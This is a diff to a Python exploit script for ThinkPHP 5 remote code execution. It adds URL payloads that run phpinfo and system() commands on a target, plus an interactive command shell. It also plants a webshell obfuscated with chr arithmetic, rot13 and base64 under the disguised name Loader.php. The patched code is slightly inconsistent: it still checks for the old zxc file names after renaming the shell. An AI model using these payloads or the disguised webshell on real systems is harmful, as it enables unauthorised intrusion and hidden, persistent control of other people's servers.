@@ -1,5 +1,5 @@
 #coding:utf-8
-#Author:LSA
+#Author:LSA Modify By H1d3r
 #Description: thinkphp5 rce getshell
 #Date:20181211
 
@@ -30,11 +30,14 @@ poc0 = '/index.php/?s=index/\\think\Container/invokefunction&function=call_user_
 poc1 = '/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
 poc2 = '/index.php/?s=index/\\think\Request/input&filter=phpinfo&data=1'
 poc3 = '/index.php?s=/index/\\think\\request/cache&key=1|phpinfo'
-poclist = [poc0,poc1,poc2,poc3]
+poc4 = '/index.php?s=index/\\think\\app/invokefunction&function=phpinfo&vars[0]=1'
+poc5 = '/index.php?s=index/\\think\\app/invokefunction&function=phpinfo&vars=1'
+poc6 = '/index.php?s=index/\\think\\app/invokefunction&function=phpinfo&return_value=&command='
+poclist = [poc0,poc1,poc2,poc3,poc4,poc5,poc6]
 
-exp0 = '/index.php/?s=index/\\think\\template\driver\\file/write&cacheFile=zxc0.php&content=<?php @eval($_POST[xxxxxx]);?>'
-exp1 = '/index.php/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=zxc1.php&vars[1][]=<?php @eval($_POST[xxxxxx]);?>'
-exp2 = '/index.php/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo \'<?php @eval($_POST[xxxxxx]);?>\'>zxc2.php'
+exp0 = '/index.php/?s=index/\\think\\template\driver\\file/write&cacheFile=Loader.php&content=<?php $PcRN=create_function(chr(01465-01421).str_rot13("f").chr(101232/912).str_rot13("z").str_rot13("r"),base64_decode("ZQ==").base64_decode("dg==").chr(0x109-0xa8).chr(105948/981).chr(01231-01161).str_rot13("$").base64_decode("cw==").chr(852-741).base64_decode("bQ==").base64_decode("ZQ==").base64_decode("KQ==").chr(060763/0651));$PcRN(base64_decode("MjY2O"."DU1O0"."BldkF"."sKCRf"."".chr(0x2ce-0x279).str_rot13("R").chr(834-777).base64_decode("VA==").base64_decode("Vg==").""."".str_rot13("S").base64_decode("dA==").chr(0x250-0x203).base64_decode("Yg==").chr(071020/01110).""."FkZXJ"."dKTs4"."MDA1N"."jU7".""));?>'
+exp1 = '/index.php/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=Loader.php&vars[1][]=<?php $PcRN=create_function(chr(01465-01421).str_rot13("f").chr(101232/912).str_rot13("z").str_rot13("r"),base64_decode("ZQ==").base64_decode("dg==").chr(0x109-0xa8).chr(105948/981).chr(01231-01161).str_rot13("$").base64_decode("cw==").chr(852-741).base64_decode("bQ==").base64_decode("ZQ==").base64_decode("KQ==").chr(060763/0651));$PcRN(base64_decode("MjY2O"."DU1O0"."BldkF"."sKCRf"."".chr(0x2ce-0x279).str_rot13("R").chr(834-777).base64_decode("VA==").base64_decode("Vg==").""."".str_rot13("S").base64_decode("dA==").chr(0x250-0x203).base64_decode("Yg==").chr(071020/01110).""."FkZXJ"."dKTs4"."MDA1N"."jU7".""));?>'
+exp2 = '/index.php/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo \'<?php $PcRN=create_function(chr(01465-01421).str_rot13("f").chr(101232/912).str_rot13("z").str_rot13("r"),base64_decode("ZQ==").base64_decode("dg==").chr(0x109-0xa8).chr(105948/981).chr(01231-01161).str_rot13("$").base64_decode("cw==").chr(852-741).base64_decode("bQ==").base64_decode("ZQ==").base64_decode("KQ==").chr(060763/0651));$PcRN(base64_decode("MjY2O"."DU1O0"."BldkF"."sKCRf"."".chr(0x2ce-0x279).str_rot13("R").chr(834-777).base64_decode("VA==").base64_decode("Vg==").""."".str_rot13("S").base64_decode("dA==").chr(0x250-0x203).base64_decode("Yg==").chr(071020/01110).""."FkZXJ"."dKTs4"."MDA1N"."jU7".""));?>\'>Loader.php'
 
 explist = [exp0,exp1,exp2]
 
@@ -43,8 +46,8 @@ cmdexp0 = '/index.php?s=index/\\think\\app/invokefunction&function=call_user_fun
 cmdexp1 = '/index.php?s=index/\\think\Request/input&filter=system&data={}'
 cmdexp2 = '/index.php?s=/index/\\think\\request/cache&key={}|system'
 cmdexp3 = '/index.php?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={}'
-
-cmdlist = [cmdexp0,cmdexp1,cmdexp2,cmdexp3]
+cmdexp4 = '/index.php?s=index/\\think\\app/invokefunction&function=system&return_value=&command={}'
+cmdlist = [cmdexp0,cmdexp1,cmdexp2,cmdexp3,cmdexp4]
 
 
 
@@ -57,6 +60,7 @@ def tp5_getshell_check(tgtUrl,timeout):
 		#print fullUrl
 		try:
 			rst = requests.get(fullUrl,headers=headers,timeout=timeout,verify=False)
+			print rst
 		except requests.exceptions.Timeout:
 			print 'phpinfo checked fail! Error: Timeout'
 			continue
@@ -67,18 +71,19 @@ def tp5_getshell_check(tgtUrl,timeout):
 			print 'phpinfo checked fail! Error: Unkonwn error0'
 			continue
 		
-		if rst.status_code == 200:
-			
-			if(rst.text.index('PHP Version')):
-				print 'phpinfo checked success! poc'  + str(p) + ': ' + poclist[p] + '\n'
+		if rst.status_code == 200 or rst.status_code == 500:
+			try:
+				if(rst.text.index('PHP Version')):
+					print 'phpinfo checked success! poc'  + str(p) + ': ' + poclist[p] + '\n'
 
-			else:
-				soup = BeautifulSoup(rst.text,'lxml')
-				if(soup.find('title')):
-					print 'Poc' + str(p) + ' phpinfo checked fail! Error title: ' + str(soup.title.string) + '\n'
 				else:
-					print 'Poc' + str(p) + ' phpinfo checked fail! ' + str(rst.text[0:11]) + '\n'
-	
+					soup = BeautifulSoup(rst.text,'lxml')
+					if(soup.find('title')):
+						print 'Poc' + str(p) + ' phpinfo checked fail! Error title: ' + str(soup.title.string) + '\n'
+					else:
+						print 'Poc' + str(p) + ' phpinfo checked fail! ' + str(rst.text[0:11]) + '\n'
+			except:
+				print 'Poc' + str(p) + ' phpinfo checked fail! ' + str(rst.text[0:11]) + '\n'
 		else:
 			print 'Poc' + str(p) + ' phpinfo checked fail! status code: ' + str(rst.status_code) + '\n'
 			continue
@@ -91,7 +96,7 @@ def tp5_getshell_cmdshell(tgtUrl,timeout):
 			rst = requests.get(fullUrl,headers=headers,timeout=timeout,verify=False)
 			#print rst.text
 			
-			if rst.status_code == 200:
+			if rst.status_code == 200 or rst.status_code == 500:
 				if 'zxc000' in rst.text:
 					print 'Getshell cmd success! now use cmdexp'  + str(c) + ': ' + cmdlist[c] + '\n'
 					while True:
@@ -142,7 +147,7 @@ def tp5_getshell_exploit(tgtUrl,timeout):
 			print 'Getshell exploited fail! Error: Unkonwn error0'
 			continue
 		
-		if rst.status_code == 200:
+		if rst.status_code == 200 or rst.status_code == 500:
 			
 			rst1 = requests.get(tgtUrl+'/zxc'+str(e)+'.php',timeout=timeout,verify=False)
 			if rst1.status_code == 200:
